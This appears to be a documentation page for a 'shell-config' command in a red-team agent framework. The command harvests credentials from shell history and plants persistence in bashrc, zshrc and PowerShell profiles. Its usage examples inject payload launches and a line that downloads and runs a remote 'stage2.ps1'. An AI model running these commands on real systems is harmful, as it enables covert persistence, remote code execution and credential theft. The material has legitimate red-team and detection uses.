+++
title = "shell-config"
chapter = false
weight = 109
hidden = false
+++

## Summary

Read shell history files, enumerate shell configuration files, and inject/remove lines from shell initialization scripts. On **Linux/macOS**, targets bashrc/zshrc/profile files. On **Windows**, targets PowerShell profile scripts. Combines credential harvesting (history files often contain passwords, connection strings, API keys) with persistence (injecting commands into shell profiles runs code on every session).

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| action | Yes | `history`: read shell history files (Unix only), `list`: enumerate config/history files, `read`: view a specific file, `inject`: append a line, `remove`: delete a matching line |
| file | Read/Inject/Remove | Target file. Unix: `.bashrc`, `.zshrc`, `/etc/profile`. Windows: profile name (e.g., `PS7 CurrentUser CurrentHost`) or full path. |
| line | Inject/Remove | Command line to inject or remove |
| user | No | Target user (default: current user). Requires privileges for other users. |
| lines | No | Number of history lines to show (default 100, Unix only) |
| comment | No | Optional inline comment appended to injected line (for tracking/cleanup) |

## Usage

### Linux/macOS

```
# List all shell config and history files
shell-config -action list

# Read last 50 lines of shell history
shell-config -action history -lines 50

# Read a specific config file
shell-config -action read -file .bashrc

# Inject persistence into .bashrc
shell-config -action inject -file .bashrc -line "/tmp/payload &" -comment "fawkes"

# Remove an injected line
shell-config -action remove -file .bashrc -line "/tmp/payload &"

# Read another user's history (requires privileges)
shell-config -action history -user root
```

### Windows (PowerShell Profiles)

```
# List all PowerShell profile locations and their existence
shell-config -action list

# Read a specific profile
shell-config -action read -file "PS7 CurrentUser CurrentHost"

# Inject persistence into default profile (creates file if missing)
shell-config -action inject -line "Start-Process C:\temp\payload.exe -WindowStyle Hidden" -comment "fawkes"

# Inject into a specific profile by full path
shell-config -action inject -file "C:\Users\admin\Documents\PowerShell\Microsoft.PowerShell_profile.ps1" -line "iex (iwr http://10.0.0.1/stage2.ps1)"

# Remove an injected line
shell-config -action remove -file "PS7 CurrentUser CurrentHost" -line "Start-Process C:\temp\payload.exe"
```

## Shell Files Scanned

### Linux/macOS

#### History Files
- `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.history`
- `~/.python_history`, `~/.mysql_history`, `~/.psql_history`, `~/.node_repl_history`

#### Config Files (User)
- `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`
- `~/.zshrc`, `~/.zprofile`, `~/.zshenv`, `~/.zlogin`

#### Config Files (System)
- `/etc/profile`, `/etc/bash.bashrc`, `/etc/bashrc`
- `/etc/zshrc`, `/etc/zsh/zshrc`, `/etc/zsh/zprofile`, `/etc/environment`

### Windows (PowerShell Profiles)

Profiles are listed in load order. Both PowerShell 7+ and Windows PowerShell 5.1 paths are checked.

| Profile | Scope | Path | Admin Required |
|---------|-------|------|----------------|
| PS7 AllUsers AllHosts | All users | `C:\Program Files\PowerShell\7\Profile.ps1` | Yes |
| PS7 AllUsers CurrentHost | All users | `C:\Program Files\PowerShell\7\Microsoft.PowerShell_profile.ps1` | Yes |
| PS7 CurrentUser AllHosts | Current user | `~\Documents\PowerShell\Profile.ps1` | No |
| PS7 CurrentUser CurrentHost | Current user | `~\Documents\PowerShell\Microsoft.PowerShell_profile.ps1` | No |
| PS5 AllUsers AllHosts | All users | `C:\Windows\System32\WindowsPowerShell\v1.0\Profile.ps1` | Yes |
| PS5 AllUsers CurrentHost | All users | `C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1` | Yes |
| PS5 CurrentUser AllHosts | Current user | `~\Documents\WindowsPowerShell\Profile.ps1` | No |
| PS5 CurrentUser CurrentHost | Current user | `~\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` | No |

## OPSEC Considerations

- History files may contain plaintext credentials, API keys, connection strings, and SSH commands
- **Unix**: Injecting into `.bashrc`/`.zshrc` executes on every interactive shell session
- **Windows**: PowerShell profiles execute every time `powershell.exe` or `pwsh.exe` starts
- CurrentUser profiles are writable without admin privileges
- AllUsers profiles require admin but affect every user on the system
- The `inject` action skips duplicate lines to avoid repeated injection
- The `comment` parameter helps track injected lines for cleanup
- PowerShell profile directories are created automatically if they don't exist

## MITRE ATT&CK Mapping

- **T1546.004** — Event Triggered Execution: Unix Shell Configuration Modification
- **T1546.013** — Event Triggered Execution: PowerShell Profile
- **T1552.003** — Unsecured Credentials: Bash History
